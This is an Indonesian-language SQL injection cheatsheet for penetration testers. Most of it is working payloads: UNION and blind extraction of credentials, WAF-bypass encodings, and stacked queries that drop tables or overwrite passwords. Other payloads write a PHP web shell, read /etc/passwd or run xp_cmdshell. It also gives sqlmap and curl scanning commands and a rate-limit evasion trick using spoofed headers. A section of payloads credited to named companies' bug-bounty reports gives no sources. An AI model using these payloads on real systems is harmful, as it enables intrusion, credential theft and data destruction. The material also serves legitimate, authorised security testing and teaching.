---
title: "SQL Injection Cheatsheet - Penetration Testing Reference"
category: "Daily"
date: 2025-06-08
tags: ["penetration-testing", "sql-injection", "cheatsheet", "infosec"]
description: "A practical SQL Injection cheatsheet tailored for penetration testers, covering payloads, bypasses, and useful tips."
---

## 1. Dasar SQL & Terminologi Penting

### Fungsi SQL Kunci
- **SELECT**: Mengambil data dari database
- **WHERE**: Filtering kondisi
- **FROM**: Menentukan tabel sumber
- **AND/OR**: Operator logika untuk kondisi
- **ORDER BY**: Mengurutkan hasil
- **LIMIT**: Membatasi jumlah hasil
- **NULL**: Nilai kosong, penting untuk UNION attacks

### Komentar SQL
- `--` (MySQL, MSSQL, PostgreSQL)
- `#` (MySQL)
- `/* */` (Universal)

---

## 2. Jenis-jenis Serangan SQLi

| Jenis | Karakteristik | Deteksi | Tingkat Kesulitan |
|-------|---------------|---------|-------------------|
| **Union-Based** | Error visible, data langsung muncul | Response berisi data database | Mudah |
| **Error-Based** | Error message mengungkap info | Error SQL dalam response | Mudah |
| **Boolean Blind** | True/False response berbeda | Perbedaan content/behavior | Sedang |
| **Time-Based Blind** | Delay dalam response | Response time berbeda | Sulit |
| **Out-of-Band** | Data dikirim via DNS/HTTP | Memerlukan external server | Expert |

---

## 3. Payload Khas SQLi

### Initial Testing
| Kategori | Payload | Penjelasan | Hasil yang Diharapkan |
|----------|---------|------------|----------------------|
| **Basic Test** | `'` | Test single quote | SQL error atau behavior berubah |
| **Logic Test** | `' OR 1=1--` | Bypass authentication | Login berhasil/data muncul |
| **Comment Test** | `' OR 1=1#` | MySQL comment | Sama dengan di atas |
| **Numeric Test** | `1 OR 1=1` | Test pada parameter numeric | Data tambahan muncul |

### Union-Based Exploitation
| Tahap | Payload | Penjelasan | Contoh |
|-------|---------|------------|---------|
| **Detect Columns** | `' ORDER BY 1--` | Cari jumlah kolom | Increment sampai error |
| **Confirm Columns** | `' UNION SELECT NULL--` | Test 1 kolom | Error = salah jumlah |
| **Multiple Columns** | `' UNION SELECT NULL,NULL,NULL--` | Test 3 kolom | No error = 3 kolom benar |
| **Identify Visible** | `' UNION SELECT 1,2,3--` | Cari kolom yang muncul | Angka muncul di response |
| **Extract Data** | `' UNION SELECT username,password,NULL FROM users--` | Dump kredensial | Username/password muncul |

### Database-Specific Payloads

#### MySQL
| Tujuan | Payload | Hasil |
|--------|---------|-------|
| **Version** | `' UNION SELECT @@version,NULL,NULL--` | MySQL version |
| **Current DB** | `' UNION SELECT database(),NULL,NULL--` | Nama database aktif |
| **List Tables** | `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--` | Daftar tabel |
| **List Columns** | `' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--` | Kolom tabel users |

#### PostgreSQL
| Tujuan | Payload | Hasil |
|--------|---------|-------|
| **Version** | `' UNION SELECT version(),NULL,NULL--` | PostgreSQL version |
| **Current DB** | `' UNION SELECT current_database(),NULL,NULL--` | Database aktif |
| **List Tables** | `' UNION SELECT tablename,NULL,NULL FROM pg_tables WHERE schemaname='public'--` | Tabel public |

#### MSSQL
| Tujuan | Payload | Hasil |
|--------|---------|-------|
| **Version** | `' UNION SELECT @@version,NULL,NULL--` | MSSQL version |
| **Current DB** | `' UNION SELECT DB_NAME(),NULL,NULL--` | Database aktif |
| **List Tables** | `' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'--` | User tables |

### Error-Based Exploitation
| DBMS | Payload | Penjelasan |
|------|---------|------------|
| **MySQL** | `' AND extractvalue(1,concat('~',(SELECT database()),'~'))--` | Extract via XML error |
| **MySQL** | `' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--` | Double query error |
| **PostgreSQL** | `' AND CAST((SELECT version()) AS int)--` | Type conversion error |
| **MSSQL** | `' AND 1=CONVERT(int,(SELECT @@version))--` | Conversion error |

### Boolean Blind Exploitation
| Tujuan | Payload | Logika |
|--------|---------|--------|
| **Test Condition** | `' AND 1=1--` | True condition |
| **False Test** | `' AND 1=2--` | False condition |
| **DB Length** | `' AND LENGTH(database())>5--` | Cek panjang nama DB |
| **Character Guess** | `' AND SUBSTRING(database(),1,1)='a'--` | Tebak karakter pertama |
| **ASCII Method** | `' AND ASCII(SUBSTRING(database(),1,1))>97--` | Metode ASCII |

### Time-Based Blind Exploitation
| DBMS | Payload | Delay |
|------|---------|-------|
| **MySQL** | `' AND SLEEP(5)--` | 5 detik delay |
| **MySQL Conditional** | `' AND IF(1=1,SLEEP(5),0)--` | Conditional delay |
| **PostgreSQL** | `' AND PG_SLEEP(5)--` | 5 detik delay |
| **MSSQL** | `'; WAITFOR DELAY '00:00:05'--` | 5 detik delay |
| **Oracle** | `' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1--` | 5 detik delay |

---

## 4. Tahapan Eksploitasi SQLi

### Step-by-Step Manual Exploitation

1. **Detection Phase**
   ```
   Original: index.php?id=1
   Test: index.php?id=1'
   Result: SQL error = vulnerable
   ```

2. **Column Count Detection**
   ```
   id=1' ORDER BY 1--    // OK
   id=1' ORDER BY 2--    // OK  
   id=1' ORDER BY 3--    // OK
   id=1' ORDER BY 4--    // Error = 3 columns
   ```

3. **Visible Column Identification**
   ```
   id=1' UNION SELECT 1,2,3--
   Result: Number 2 and 3 visible in response
   ```

4. **Information Gathering**
   ```
   id=1' UNION SELECT 1,@@version,database()--
   Result: MySQL version and current database
   ```

5. **Table Enumeration**
   ```
   id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
   ```

6. **Column Enumeration**
   ```
   id=1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
   ```

7. **Data Extraction**
   ```
   id=1' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
   ```

---

## 5. Tips Praktikal dan Tools

### Manual Testing Checklist
- [ ] Test dengan single quote `'`
- [ ] Test dengan double quote `"`
- [ ] Test dengan numeric injection
- [ ] Test dengan boolean conditions
- [ ] Test dengan time delays
- [ ] Test dengan UNION statements
- [ ] Test dengan comment variations

### SQLMap Command Examples
```bash
# Basic scan
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Specific database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump

# POST request with cookie
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --cookie="PHPSESSID=abc123"
```

### Burp Suite Integration
- Use Repeater for manual payload testing
- Use Intruder for automated parameter fuzzing
- Configure proxy to intercept and modify requests
- Save successful payloads for future reference

---

## 6. WAF Bypass Techniques

### Character Encoding
| Technique | Example | Explanation |
|-----------|---------|-------------|
| **URL Encoding** | `%27` instead of `'` | Bypass basic filtering |
| **Double Encoding** | `%2527` instead of `'` | Bypass double decode |
| **Hex Encoding** | `0x61646D696E` instead of `admin` | MySQL hex strings |
| **Char Function** | `CHAR(97,100,109,105,110)` | ASCII to string |

### Keyword Obfuscation
| Technique | Payload | Bypass |
|-----------|---------|--------|
| **Case Variation** | `UnIoN sElEcT` | Case-sensitive filters |
| **Comment Insertion** | `UN/**/ION SE/**/LECT` | Keyword splitting |
| **Alternative Syntax** | `||` instead of `OR` | Alternative operators |
| **Whitespace Variation** | `UNION%09SELECT` | Tab instead of space |

### Advanced WAF Bypass
| Method | Payload Example | Target |
|--------|-----------------|--------|
| **Function Calls** | `database/**/()` | Function detection |
| **Nested Comments** | `/*!50000UNION*/` | Version-based comments |
| **HTTP Parameter Pollution** | `?id=1&id=' UNION SELECT--` | Parameter parsing |
| **Content-Type Manipulation** | Change to `application/json` | Request type filtering |

---

## 7. Second-Order SQL Injection

### Konsep
Second-order SQLi terjadi ketika input user disimpan dulu di database, kemudian digunakan dalam query lain tanpa sanitasi.

| Stage | Description | Example |
|-------|-------------|---------|
| **Storage** | Input disimpan dengan aman | `INSERT INTO users (username) VALUES ('admin\'--')` |
| **Retrieval** | Data diambil dan digunakan unsafe | `SELECT * FROM logs WHERE user='admin'--'` |
| **Exploitation** | Payload dieksekusi di tahap kedua | Comment bypass pada query kedua |

### Detection Techniques
```sql
-- Test payload untuk disimpan
username: test'+(SELECT database())+'

-- Payload akan dieksekusi saat data digunakan di query lain
-- Contoh: email notifications, admin panels, reports
```

---

## 8. Advanced Exploitation Techniques

### Stacked Queries
| DBMS | Payload | Capability |
|------|---------|------------|
| **MSSQL** | `'; INSERT INTO users VALUES('hacker','pass123')--` | Command execution |
| **PostgreSQL** | `'; CREATE TABLE temp(data text)--` | Table creation |
| **MySQL** | `'; UPDATE users SET password='hacked'--` | Data modification |

### File Operations
| DBMS | Operation | Payload |
|------|-----------|---------|
| **MySQL** | **Read File** | `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--` |
| **MySQL** | **Write File** | `' UNION SELECT 'shell code',NULL,NULL INTO OUTFILE '/var/www/shell.php'--` |
| **MSSQL** | **Read File** | `' UNION SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_BLOB) AS t--` |
| **PostgreSQL** | **Read File** | `'; COPY temp FROM '/etc/passwd'--` |

### Command Execution
| DBMS | Payload | Requirements |
|------|---------|--------------|
| **MSSQL** | `'; EXEC xp_cmdshell('whoami')--` | xp_cmdshell enabled |
| **PostgreSQL** | `'; CREATE OR REPLACE FUNCTION sys(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'c'--` | Superuser privileges |
| **MySQL** | `' UNION SELECT sys_exec('whoami'),NULL,NULL--` | MySQL UDF installed |

---

## 9. NoSQL Injection

### MongoDB Injection
| Context | Payload | Explanation |
|---------|---------|-------------|
| **JSON** | `{"username": {"$ne": null}, "password": {"$ne": null}}` | Not equal bypass |
| **URL** | `username[$ne]=admin&password[$ne]=pass` | URL parameter injection |
| **Regex** | `{"username": {"$regex": "^admin"}}` | Regex-based enumeration |

### JavaScript Injection (MongoDB)
```javascript
// Payload untuk where clause
username=admin'; return true; var dummy='

// Payload untuk mapReduce
function() { return true; }
```

---

## 10. WebSocket SQL Injection

### Detection
```json
// Test payload melalui WebSocket
{"action": "search", "query": "test' OR 1=1--"}

// Time-based testing
{"id": "1'; WAITFOR DELAY '00:00:05'--"}
```

### Exploitation
```json
// Union-based via WebSocket
{"filter": "category' UNION SELECT username,password,null FROM users--"}
```

---

## 11. GraphQL Injection

### Basic Testing
```graphql
# Test single quote
query { user(id: "1'") { name } }

# Union injection attempt  
query { user(id: "1' UNION SELECT password FROM users--") { name } }

# Introspection queries
query { __schema { types { name } } }
```

---

## 12. Automation Scripts

### Python SQLi Detector
```python
import requests
import time

def test_sqli(url, param):
    payloads = ["'", "' OR 1=1--", "' AND SLEEP(5)--"]
    
    for payload in payloads:
        data = {param: payload}
        start_time = time.time()
        response = requests.post(url, data=data)
        response_time = time.time() - start_time
        
        if "error" in response.text.lower() or response_time > 4:
            print(f"[+] Potential SQLi: {payload}")
            return True
    return False
```

### Bash One-Liner Testing
```bash
# Quick SQLi test with curl
for payload in "'" "' OR 1=1--" "' AND 1=2--"; do
    echo "Testing: $payload"
    curl -s "http://target.com/page.php?id=1$payload" | grep -i error && echo "[VULN]"
done
```

---

## 13. Mobile App SQL Injection

### Android SQLite
```sql
-- Common vulnerable patterns
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";

-- Exploitation
userInput = "' OR 1=1--"
```

### iOS Core Data
```objc
// Vulnerable NSPredicate
NSPredicate *predicate = [NSPredicate predicateWithFormat:@"name = '%@'", userInput];

// Exploitation  
userInput = @"' OR 1=1--"
```

---

## 14. Cloud Database Specific

### Amazon RDS (MySQL/PostgreSQL)
```sql
-- RDS information gathering
' UNION SELECT @@hostname,@@datadir,@@version_comment--

-- RDS specific tables
' UNION SELECT * FROM information_schema.user_privileges--
```

### Google Cloud SQL
```sql
-- Cloud SQL detection
' UNION SELECT @@version_comment,@@socket,@@port--
```

### Azure SQL Database
```sql
-- Azure specific functions
' UNION SELECT SERVERPROPERTY('ProductVersion'),SERVERPROPERTY('Edition'),USER_NAME()--
```

---

## 15. AI/ML Model SQL Injection

### Vector Database Injection
```sql
-- Chroma/Pinecone-style injection
search_query = "user input' UNION SELECT api_key FROM config--"

-- Embedding manipulation
embedding_query = "'; DROP TABLE embeddings--"
```

---

## 16. Real CTF/Bug Bounty Payloads

### HackerOne Famous Payloads
```sql
-- Shopify GraphQL (2020)
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,shop_domain FROM shops LIMIT 1--

-- Facebook OAuth SQLi (2019)  
client_id=' UNION SELECT NULL,NULL,secret FROM oauth_clients--

-- GitHub Enterprise SQLi (2018)
search=' UNION SELECT NULL,NULL,NULL,password_hash FROM users WHERE login='admin'--
```

### CTF Classic Payloads
```sql
-- PicoCTF style
' OR 1=1 LIMIT 1 OFFSET 1--

-- OverTheWire style  
' UNION SELECT NULL,load_file('/flag.txt'),NULL--

-- Google CTF style
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flags LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

---

## 17. Common Vulnerable Patterns

### PHP Code Patterns
```php
// Vulnerable
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];

// Vulnerable  
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "'";

// Vulnerable
$query = "SELECT * FROM users WHERE id = $id";
```

### Detection Signatures
- Parameters accepting user input without validation
- Dynamic SQL construction with string concatenation
- Missing prepared statements/parameterized queries
- Error messages revealing SQL syntax

---

## 18. Error Message Analysis

### MySQL Error Signatures
```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
Operand should contain 1 column(s)
Unknown column 'X' in 'field list'
Table 'database.table' doesn't exist
```

### PostgreSQL Error Signatures  
```
ERROR: syntax error at or near "'"
ERROR: column "X" must appear in the GROUP BY clause
ERROR: relation "table" does not exist
ERROR: invalid input syntax for integer: "X"
```

### MSSQL Error Signatures
```
Unclosed quotation mark after the character string
Invalid column name 'X'
Conversion failed when converting the varchar value 'X' to data type int
The multi-part identifier "X" could not be bound
```

### Oracle Error Signatures
```
ORA-00933: SQL command not properly ended
ORA-00904: "X": invalid identifier  
ORA-01756: quoted string not properly terminated
ORA-00942: table or view does not exist
```

---

## 19. HTTP Header Injection

### User-Agent SQLi
```http
User-Agent: Mozilla/5.0' UNION SELECT @@version,NULL,NULL--
X-Forwarded-For: 127.0.0.1' OR 1=1--
X-Real-IP: 192.168.1.1'; DROP TABLE logs--
Referer: http://evil.com' UNION SELECT password FROM users--
```

### Cookie-Based SQLi
```http
Cookie: sessionid=abc123' UNION SELECT user_id,password,email FROM users--
Cookie: tracking=' OR 1=CAST((SELECT password FROM users LIMIT 1) as int)--
```

---

## 20. JSON SQL Injection

### JSON Parameter Injection
```json
{
  "id": "1' UNION SELECT @@version,NULL,NULL--",
  "search": {
    "term": "test' OR 1=1--"
  },
  "filters": [
    {"field": "category", "value": "all' UNION SELECT password FROM users--"}
  ]
}
```

### JSON Array Injection
```json
{
  "ids": ["1", "2", "3' UNION SELECT database()--"],
  "batch": [
    {"query": "SELECT * FROM products WHERE id=1' OR 1=1--"}
  ]
}
```

---

## 21. XML SQL Injection

### SOAP SQLi
```xml
<soap:Envelope>
  <soap:Body>
    <getUserInfo>
      <userId>1' UNION SELECT @@version,NULL--</userId>
    </getUserInfo>
  </soap:Body>
</soap:Envelope>
```

### XML Parameter Injection
```xml
<?xml version="1.0"?>
<request>
  <search>test' UNION SELECT password FROM users--</search>
  <filter><![CDATA[category=' OR 1=1--]]></filter>
</request>
```

---

## 22. Rate Limiting Bypass

### Distributed Testing
```bash
# Rotate User-Agents
curl -H "User-Agent: Bot1" "http://target.com/api?id=1'"
curl -H "User-Agent: Bot2" "http://target.com/api?id=1'"

# Rotate X-Forwarded-For
curl -H "X-Forwarded-For: 1.1.1.1" "http://target.com/api?id=1'"
curl -H "X-Forwarded-For: 2.2.2.2" "http://target.com/api?id=1'"
```

### Slow Testing Techniques
```python
import time
import random

def slow_sqli_test():
    delay = random.uniform(1, 5)  # 1-5 seconds random delay
    time.sleep(delay)
    # Execute SQLi payload
```

---

## 23. Browser-Based SQLi Testing

### JavaScript SQLi Testing
```javascript
// XHR-based testing
function testSQLi(url, param, payload) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.responseText.includes('error') || xhr.responseText.includes('mysql')) {
                console.log('Potential SQLi found!');
            }
        }
    };
    
    xhr.send(`${param}=${encodeURIComponent(payload)}`);
}

// Usage
testSQLi('/search.php', 'q', "' OR 1=1--");
```

### Fetch API Testing
```javascript
async function testSQLiModern(endpoint, payload) {
    try {
        const response = await fetch(endpoint, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({query: payload})
        });
        
        const data = await response.text();
        
        if (data.includes('error') || response.status === 500) {
            console.log('SQLi detected:', payload);
        }
    } catch (error) {
        console.log('Request failed:', error);
    }
}
```

---

## 24. Remediation Testing

### Testing Prepared Statements
```sql
-- Should NOT be vulnerable
PREPARE stmt FROM 'SELECT * FROM users WHERE id = ?';
SET @id = "1' OR 1=1--"; 
EXECUTE stmt USING @id;
```

### Input Validation Bypass Tests
```sql
-- Test escaping functions
addslashes("'") → "\'"
mysql_real_escape_string("'") → "\'"

-- Bypass attempts
\' → \'
\\\' → \\\'  (potential bypass)
%bf' → 廢' (charset confusion)
```

---

## 25. Quick Reference Commands

### One-Liner Payloads
```sql
-- MySQL version
' UNION SELECT @@version,NULL,NULL#

-- Current user
' UNION SELECT USER(),NULL,NULL#

-- List databases
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata#

-- List tables
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='database_name'#

-- List columns
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='table_name'#

-- Extract data
' UNION SELECT username,password,NULL FROM users#
```

### Testing Checklist Priority
1. **High Priority**: Login forms, search functions, URL parameters
2. **Medium Priority**: API endpoints, JSON parameters, Cookie values  
3. **Low Priority**: HTTP headers, file upload parameters

---

*Disclaimer: Cheatsheet ini ditujukan untuk keperluan penetration testing yang sah dan ethical hacking dengan izin eksplisit. Penggunaan untuk tujuan ilegal adalah tanggung jawab pengguna.*